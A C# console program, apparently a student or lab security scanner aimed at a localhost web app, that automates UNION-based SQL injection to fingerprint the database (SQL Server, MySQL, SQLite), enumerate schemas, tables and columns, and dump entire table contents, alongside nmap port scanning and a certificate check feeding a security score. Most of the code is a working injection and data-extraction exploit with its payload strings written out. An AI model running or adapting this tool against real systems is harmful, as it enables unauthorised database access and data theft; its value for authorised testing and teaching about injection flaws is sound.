﻿using System.Net;
using System.Diagnostics;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;

namespace Vizsgalo
{
    public class Scanner
    {
        private static string _baseResponse = ""; // this is the base response which makes the base query (for comparing with the injected results later)
        
        private static readonly string AsterisksSeparator = new string('*', Console.WindowWidth);
        private const string UnionStart = "'' OR 1=1 UNION ALL SELECT ";
        private static int _unionNumber; // it represents how many plus columns we need to write in the union selects
        private static string _unionColumnsString = ""; // it represents the union columns (the default value is "" aka no extra column)
        private static string _db = "";
        private static string _dbVersion = "";
        private const string IsSqlServerOrMySql = "@@version;--";
        private const string IsSqlite = "sqlite_version();--";
        private const string NmapPath = "C:\\Program Files (x86)\\Nmap\\nmap.exe";

        private static HttpClient _httpClient = new()
        {
            /* YOU CAN CHANGE THE BASE ADDRESS MANUALLY BEFORE RUNNING THE APP */
            //BaseAddress = new Uri("http://localhost:5227/Users")
            BaseAddress = new Uri("https://localhost:7002/Users")
        };

        public static async Task Main()
        {
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Examination started\n");
            
            await StartExamination(_httpClient);
            
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Examination finished");
        }
        
        // sends a GET request to the given url and writes the responses to the console
        static async Task StartExamination(HttpClient httpClient)
        {
            SetEndpoint(httpClient);
            string[] parameters = GetQueryParameters();
            string firstParameter = parameters[0];

            await GetBaseResponse(httpClient, firstParameter);

            await SetupUnionAndDatabase(httpClient, firstParameter);

            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                "\nSuccess, " + _db + " is used, database version: " + _dbVersion);
            Console.WriteLine();
            InfoColors.WriteToConsole(InfoColors.SummaryText, 
                "Number of extra columns: " + _unionNumber + ", the union section of the query string: " + _unionColumnsString);

            // execute the commands given by the user (the options are specified below)
            ConsoleKeyInfo key;
            do
            {
                PrintCommandList();
                key = Console.ReadKey();
                Console.WriteLine();

                switch (key.Key)
                {
                    // OPTION 1: get all schema names in the current database
                    case ConsoleKey.D1:
                        await HandleAllSchemas(httpClient, firstParameter);
                        break;

                    // OPTION 2: get all table names in the given schema
                    case ConsoleKey.D2:
                        await HandleTablesInSchema(httpClient, firstParameter);
                        break;

                    // OPTION 3: get the given table's schema
                    case ConsoleKey.D3:
                        await HandleTableSchemas(httpClient, firstParameter);
                        break;

                    // OPTION 4: get all data from a specific database column
                    case ConsoleKey.D4:
                        await HandleDataFromColumn(httpClient, firstParameter);
                        break;

                    // OPTION 5: get all data from the given database
                    case ConsoleKey.D5:
                        await HandleAllDataFromTable(httpClient, firstParameter);
                        break;

                    // OPTION 6: scan for open ports
                    case ConsoleKey.D6:
                        HandlePortScanning();
                        break;

                    // OPTION 7: check the validity of the server's certificate
                    case ConsoleKey.D7:
                        HandleCertificateCheck(httpClient);
                        break;

                    // OPTION 9: run a full analysis and calculate a score
                    case ConsoleKey.D9:
                        await HandleFullAnalysis(httpClient, firstParameter);
                        break;
                }
            } while (key.Key != ConsoleKey.D0); // if the 0 button is pressed then the examination finishes
        }
        
        /* ----------------------------------------- Key event handlers --------------------------------------------- */
        static async Task HandleAllSchemas(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                "\nAll schemas in the current database:");
            string response = await GetAllSchemaNames(httpClient, firstParameter);
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
        }

        static async Task HandleTablesInSchema(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the schema:");
            string schemaName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (schemaName != "")
            {
                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                    "\nAll tables in the given schema:");
                string response = await GetTableNamesInSchema(httpClient, schemaName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
            }
        }

        static async Task HandleTableSchemas(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the table:");
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "")
            {
                string columnNames = await GetTableColumnNames(httpClient, tableName, firstParameter);
                string columnTypes = await GetTableColumnTypes(httpClient, tableName, firstParameter);
                string fullResponse = CreateTableSchemaResponse(columnNames, columnTypes);
                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                    "\nThe given table's schema:");
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, fullResponse);
            }
        }

        static async Task HandleDataFromColumn(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the table:");
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the column:");
            string columnName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "" && columnName != "")
            {
                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                    "\nGetting all data from table " + tableName + " from column " + columnName);
                string response = await GetDataFromTableColumn(httpClient, tableName, columnName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
            }
        }

        static async Task HandleAllDataFromTable(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the table:");
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "")
            {
                string data = await GetAllDataFromTable(httpClient, tableName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, data);
            }
        }

        static void HandlePortScanning()
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the server's IP address:");
            string address = Console.ReadLine() ?? "";
            
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the nmap arguments:");
            string pars = Console.ReadLine() ?? "";
            string args = pars + " " + address;
            
            Console.WriteLine();
            if (args != " ")
            {
                InfoColors.WriteToConsole(InfoColors.ScanningStartText,
                    "Scanning " + address + " with these parameters: " + pars);
                string result = ScanForOpenPorts(args);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
                InfoColors.WriteToConsole(InfoColors.SummaryText,
                    "Number of open ports: " + Regex.Matches(result, "open").Count);
            }
            else
            {
                InfoColors.WriteToConsole(InfoColors.StatusError,"Invalid parameters!");
            }
        }

        static string HandleCertificateCheck(HttpClient httpClient, bool writeResultToConsole = true)
        {
            string address = httpClient.BaseAddress != null
                ? httpClient.BaseAddress.ToString()
                : "localhost";
            string result = "";
            if (address.Contains("http"))
            {
                result = CheckCertificate(address);
            } else
            {
                string httpAddress = "https://" + address;
                result = CheckCertificate(httpAddress);
            }

            if (writeResultToConsole)
            {
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
            }
            
            return result;
        }

        static async Task HandleFullAnalysis(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                "\nRunning full analysis on the target site...");
            await RunFullAnalysis(httpClient, firstParameter);
        }
        /* ---------------------------------------------------------------------------------------------------------- */
        

        // sets the endpoint given by the user
        static void SetEndpoint(HttpClient httpClient)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "Enter the endpoint of the target URL (e.g. /Sqlserver/ )");
            string endPoint = Console.ReadLine() ?? "/Sqlserver/";
            if (endPoint == "")
            {
                endPoint = "/Sqlserver/";
            }
            httpClient.BaseAddress = new Uri(httpClient.BaseAddress + endPoint);
            InfoColors.WriteToConsole(InfoColors.SummaryText,
                "Total base address: " + httpClient.BaseAddress);
        }

        // gets the URL query parameters from the user
        static string[] GetQueryParameters()
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the query string parameters (separated with ; characters):");
            string paramsString = Console.ReadLine() ?? "";
            
            return paramsString.Split(";");
        }

        // gets the base response which is returned to the base injected query (for result filtering)
        static async Task GetBaseResponse(HttpClient httpClient, string firstParameter)
        {
            // gets the base response
            HttpResponseMessage baseResponse = await httpClient.GetAsync("?" + firstParameter + "=" + "'' OR 1=1;--");
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, baseResponse.RequestMessage!.ToString());
            var jsonBaseResponse = await baseResponse.Content.ReadAsStringAsync();
            _baseResponse = jsonBaseResponse;
        }

        // determines the number of union columns and that which database is used
        static async Task SetupUnionAndDatabase(HttpClient httpClient, string firstParameter)
        {
            HttpResponseMessage unionResponse;
            var jsonUnionResponse = "";
            string unionUrlBase = "?" + firstParameter + "=" + UnionStart;
            
            do
            {
                _unionNumber++;
                Console.WriteLine();
                InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                    _unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
                Console.WriteLine();
                
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                    "Checking for SQL Server or MySql first...");
                _unionColumnsString = _unionColumnsString == "" ? "'0'" : _unionColumnsString + ",'0'";
                string unionSqlServerOrMySql = unionUrlBase + _unionColumnsString + ", " + IsSqlServerOrMySql;
                
                unionResponse = await httpClient.GetAsync(unionSqlServerOrMySql);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
                jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                
                InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
                    "Status code: " + unionResponse.StatusCode);
                if (unionResponse.StatusCode != HttpStatusCode.OK) // if it wasn't SQL Server or MySql then it checks for SQLite
                {
                    InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                        "Checking for SQLite...");
                    string unionSqlite = unionUrlBase + _unionColumnsString + ", " + IsSqlite;
                    unionResponse = await httpClient.GetAsync(unionSqlite);
                    
                    InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
                    InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
                    
                    jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                    InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
                        "Status code: " + unionResponse.StatusCode);

                    if (unionResponse.StatusCode == HttpStatusCode.OK)
                    {
                        _db = "sqlite";
                        _dbVersion = jsonUnionResponse.Contains("sqlite3") || jsonUnionResponse.Contains("3.4") ? "3.4" : "old-sqlite";
                    }
                }
                // else it checks whether it is SQL Server or MySql
                else 
                {
                    if (jsonUnionResponse.Contains("<table"))
                    {
                        if (jsonUnionResponse.Contains("Microsoft SQL Server"))
                        {
                            _db = "sqlserver";
                            _dbVersion =
                                jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
                        }
                        else
                        {
                            _db = "mysql";
                            _dbVersion = "Unknown";
                        }
                    }
                }
            } while (unionResponse.StatusCode != HttpStatusCode.OK || !jsonUnionResponse.Contains("<table"));
        }

        static void PrintCommandList()
        {
            Console.WriteLine();
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
                AsterisksSeparator + "\nSelect an operation to be executed by the application");
            
            InfoColors.WriteToConsole(InfoColors.Operations1,
                "\nDATABASE OPERATIONS" +
                "\n> Press '1' to get all schema names in the current database" +
                "\n> Press '2' to get all table names in the given schema" +
                "\n> Press '3' to get the given table's schema" +
                "\n> Press '4' to get all data from a specific table column" +
                "\n> Press '5' to get all data from a given table");
                
            InfoColors.WriteToConsole(InfoColors.Operations2,
                "\nNETWORK AND SERVER OPERATIONS" +
                "\n> Press '6' to scan the server for open ports" +
                "\n> Press '7' to check the validity of the server's certificate");
                
            InfoColors.WriteToConsole(InfoColors.Operations3,
                "\nFULL ANALYSIS" +
                "\n> Press '9' to run a full analysis and read results");

            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
                "\n> Press '0' to escape (finish) the examination\n" + AsterisksSeparator);
        }

        
        // starts the full automatic analysis
        static async Task RunFullAnalysis(HttpClient httpClient, string firstQueryParameter)
        {
            /*
             Full analysis:
                1. get table names, query the first (get all data) -> sql injection score
                    - if it's not possible to get table schema -> 0.5
                    - if it's possible to get table schema but not the data -> 0.25
                    - if it's possible to get every information -> 0
                2. scan for open ports -> ports score
                    - if the number of open ports is lower or equal than 10 -> 1
                    - else 0
                3. check certificate -> certificate score
                    - if the number of valid certificates is at least 1 -> 1
                    - else 0
                4. score summary
                    prints summaries by processes and a full score:
                    full score = (injection + ports + certificate) / 3
            */

            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Starting auto analysis...");

            // PROCESS 1: test sql injection
            double sqlInjectionScore = await AutoTestSqlInjection(httpClient, firstQueryParameter); // it starts from 0.5 if it got here (the app got the db and the union select with SQL injections)

            // PROCESS 2: test open ports
            double portsScore = AutoTestPorts();

            // PROCESS 3: test certificates
            double certificateScore = AutoTestCertificates(httpClient);
            
            
            /* SUMMARIES */
            DisplaySummariesByProcesses(sqlInjectionScore, portsScore, certificateScore);

            double fullScore = (sqlInjectionScore + portsScore + certificateScore) / 3;
            DisplayOverallSummary(fullScore);
        }

        static async Task<double> AutoTestSqlInjection(HttpClient httpClient, string firstQueryParameter)
        {
            // STEP 1: get table schemas
            string schemaNames = await GetAllSchemaNames(httpClient, firstQueryParameter);
            string[] response = schemaNames.Split(" | ");
            if (response.Length > 0)
            {
                // STEP 2: get table names in the first schema
                string tableNames = await GetTableNamesInSchema(httpClient, response[0], firstQueryParameter);
                response = tableNames.Split(" | ");
                if (response.Length > 0)
                {
                    // STEP 3: get all data from the first table
                    string tableData = await GetAllDataFromTable(httpClient, response[0], firstQueryParameter);
                    response = tableData.Split(" | ");
                    if (response.Length > 0)
                    {
                        return 0;
                    }
                    
                    return 0.25;
                }
            }
            
            return 0.5;
        }

        static double AutoTestPorts()
        {
            InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Scanning for open ports...");
            string result = ScanForOpenPorts("-p- localhost");
            
            int openPorts = Regex.Matches(result, "open").Count;
            
            return openPorts > 20 ? 0 : 1;
        }

        static double AutoTestCertificates(HttpClient httpClient)
        {
            InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Checking server certificates...");
            string result = HandleCertificateCheck(httpClient, false);
            string[] response = result.Split(" | ");
            
            return response.Length == 0 || (response.Length == 1 && !response[0].Contains("Valid")) ? 0 : 1;
        }

        
        // displays summaries by processes at the end of the automatic analysis
        static void DisplaySummariesByProcesses(double sqlInjectionScore, double portsScore, double certificateScore)
        {
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
                "\nFull analysis finished! Results by categories:");
            
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                "\nSQL injection score:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                AreEqual(sqlInjectionScore, 0.5) ?
                    "It was possible to perform an SQL injection, but could not get any data from the database. Medium security." :
                    AreEqual(sqlInjectionScore, 0.25) ?
                        "It was possible to get all database schemas and the tables in them, but could not get any data from the tables. Low security." :
                        "It was possible to retrieve all data from the database. Zero security.");
            
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                "\nPorts score:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText,
                AreEqual(portsScore, 1.0) ?
                    "The total number of open ports is not higher than 20. Optimal security.":
                    "The total number of open ports is higher than 20. Low security.");
            
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                "\nCertificates score:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                AreEqual(certificateScore, 1.0) ?
                    "There is at least 1 valid certificate. Optimal security.":
                    "There are no valid certificates. Zero security.");
        }

        // displays the overall summary at the end of the automatic analysis
        static void DisplayOverallSummary(double fullScore)
        {
            InfoColors.WriteToConsole(InfoColors.SummaryText, 
                "\nOverall score:\n" + Math.Round(fullScore, 2) * 100 + "%");
        }
        
        
        /* INDIVIDUAL TASKS */
        static async Task<string> GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver")
            {
                 url += "schema_name(t.schema_id) FROM sys.tables t;--";
            } else if (_db == "mysql")
            {
                url += "schema_name FROM information_schema.schemata;--";
            } else if (_db == "sqlite")
            {
                url += "name FROM sqlite_master;--";
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver")
            {
                url += "t.name FROM sys.tables t where schema_name(t.schema_id) = '" + schemaName + "';--";
            } else if (_db == "mysql")
            {
                url += "table_name FROM information_schema.tables where table_schema = '" + schemaName + "';--";
            } else if (_db == "sqlite")
            {
                url += "name FROM sqlite_schema where type = 'table';--";
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetTableColumnNames(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver" || _db == "mysql")
            {
                url += "COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableName + "';--";
            } else if (_db == "sqlite")
            {
                url += "name FROM pragma_table_info('" + tableName + "');--";
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetTableColumnTypes(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver" || _db == "mysql")
            {
                url += "DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableName + "';--";
            } else if (_db == "sqlite")
            {
                url += "type FROM pragma_table_info('" + tableName + "');--";
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
        {
            string sqlserverCast = "CONVERT(varchar(max), " + columnName + ")";
            string mysqlCast = "CONVERT(" + columnName + ", CHAR) COLLATE utf8mb4_hungarian_ci";
            string sqliteCast = columnName;
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", " +
                         (_db == "sqlserver" ? sqlserverCast : _db == "mysql" ? mysqlCast : sqliteCast)
                         + " FROM " + tableName + ";--";
            // sends GET request to server
            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                "\nGetting all data using " + _db + "...");
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                "\nGetting all data using " + _db + "...");
            
            string res = await GetTableColumnNames(httpClient, tableName, firstQueryParameter);
            string[] columnNames = res.Split(" | ");

            List<string[]> allData = new List<string[]>();
            for (int i = 0; i < columnNames.Length; i++)
            {
                string columnData = await GetDataFromTableColumn(httpClient, tableName, columnNames[i], firstQueryParameter);
                allData.Add(columnData.Split(" | "));
            }

            if (allData.Count == 0)
            {
                return "";
            }
            
            // all columns have the same number of rows
            int rowNum = allData[0].Length + 1;
            string[] formattedRows = new string[rowNum];
            
            // Calculate the maximum length of column names
            int maxColumnNameLength = columnNames.Max(name => name.Length);
            
            // the first row will be the column names
            string firstRow = "";
            for (int i = 0; i < columnNames.Length; i++)
            {
                firstRow += columnNames[i].PadRight(maxColumnNameLength + 5);
            }
            formattedRows[0] = firstRow; 
            
            for (int i = 1; i < rowNum; i++)
            {
                string fullString = "";
                for (int j = 0; j < allData.Count; j++)
                {
                    fullString += allData[j][i-1].PadRight(maxColumnNameLength + 5);
                }

                formattedRows[i] = fullString;
            }

            return string.Join("\n", formattedRows);
        }

        static string ScanForOpenPorts(string arguments)
        {
            InfoColors.WriteToConsole(InfoColors.ScanningStartText,"\nScanning in progress...");
            
            string result;
            
            using (Process process = new Process())
            {
                process.StartInfo.FileName = NmapPath;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                using (StreamReader reader = process.StandardOutput)
                {
                    result = reader.ReadToEnd();
                }

                process.WaitForExit();
            }
            
            return result;
        }

        static string CheckCertificate(string address)
        {
            try
            {
                try
                {
                    const string serverAddress = "localhost";
                    const int port = 7002;
                    using (TcpClient client = new TcpClient(serverAddress, port))
                    {
                        // creates an SslStream to secure the connection
                        using (SslStream sslStream = new SslStream(client.GetStream(), false))
                        {
                            // authenticates the server
                            sslStream.AuthenticateAsClient(serverAddress);

                            // retrieves the server certificate
                            X509Certificate? serverCertificate = sslStream.RemoteCertificate;

                            if (serverCertificate != null)
                            {
                                X509Certificate2 cert2 = new X509Certificate2(serverCertificate);
                                
                                Console.WriteLine($"Server Certificate Information:");
                                string subject = cert2.Subject;
                                string issuer = cert2.Issuer;
                                DateTime expiry = cert2.NotAfter;
                                
                                return "Certificate info:" +
                                    "\nSubject: " + subject +
                                    "\nIssuer: " + issuer +
                                    (DateTime.Compare(expiry, DateTime.Now) < 0 ? "\nExpired (on " : "\nValid (through ") +
                                    expiry + ")";
                            }
                            
                            return "\nThe server did not provide any certificates.";
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error checking {address}: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                InfoColors.WriteToConsole(InfoColors.StatusError, 
                    "Error: " + ex.Message);
            }
            return "";
        }
        
        static async Task<string[]> GetRequest(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, response.RequestMessage!.ToString());
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nResponse:");
            string[] filteredResponse = FilterResponse(jsonResponse);
            return filteredResponse;
        }


        static string[] FilterResponse(string fullResponse)
        {
            return FilterTableData(GetMiddleSubstring(_baseResponse, fullResponse));
        }
        
        static string GetMiddleSubstring(string first, string second)
        {
            // finds the common prefix
            int commonPrefixLength = 0;
            while (commonPrefixLength < first.Length && commonPrefixLength < second.Length && first[commonPrefixLength] == second[commonPrefixLength])
            {
                commonPrefixLength++;
            }

            // finds the common suffix
            int commonSuffixLength = 0;
            while (commonSuffixLength < first.Length - commonPrefixLength
                   && commonSuffixLength < second.Length - commonPrefixLength
                   && first[first.Length - commonSuffixLength - 1] == second[second.Length - commonSuffixLength - 1])
            {
                commonSuffixLength++;
            }

            // extracts the middle substring
            int middleStart = commonPrefixLength;
            int middleLength = second.Length - commonPrefixLength - commonSuffixLength;

            if (middleLength > 0)
            {
                return second.Substring(middleStart, middleLength);
            }

            return ""; // If no middle substring found
        }

        static string[] FilterTableData(string rawData)
        {
            if (!rawData.Contains("td"))
            {
                string[] raw = new string[1];
                raw[0] = rawData;
                return raw;
            }

            string[] fields = 
                rawData
                    .Replace("</", String.Empty)
                    .Replace("/>", String.Empty)
                    .Replace("<", String.Empty)
                    .Replace(">", String.Empty)
                    .Replace("tr", String.Empty)
                    .Replace(" ", String.Empty)
                    .Split("td");
            var finalFields = new List<string>();
            for (int i = 0; i < fields.Length; i++)
            {
                if (!string.IsNullOrWhiteSpace(fields[i]) && !fields[i].Equals("0"))
                {
                    finalFields.Add(WebUtility.HtmlDecode(fields[i]));
                }
            }
            return finalFields.ToArray();
        }
        
        // checks equality between two double values
        static bool AreEqual(double var1, double var2, double tolerance = 0.0001)
        {
            return Math.Abs(var1 - var2) < tolerance;
        }
        
        // appends the column names with the column types
        static string CreateTableSchemaResponse(string columnNamesString, string columnTypesString)
        {
            string[] columnNames = columnNamesString.Split(" | ");
            string[] columnTypes = columnTypesString.Split(" | ");

            // calculates the maximum length of column names
            int maxColumnNameLength = columnNames.Max(name => name.Length);
            string response = "Column name".PadRight(maxColumnNameLength + 5) + "Column type";
            
            for (int i = 0; i < columnNames.Length; i++)
            {
                response += "\n" + columnNames[i].PadRight(maxColumnNameLength + 5) + (columnTypes.Length > i ? columnTypes[i] : "Unknown");
            }
            
            return response;
        }
    }
}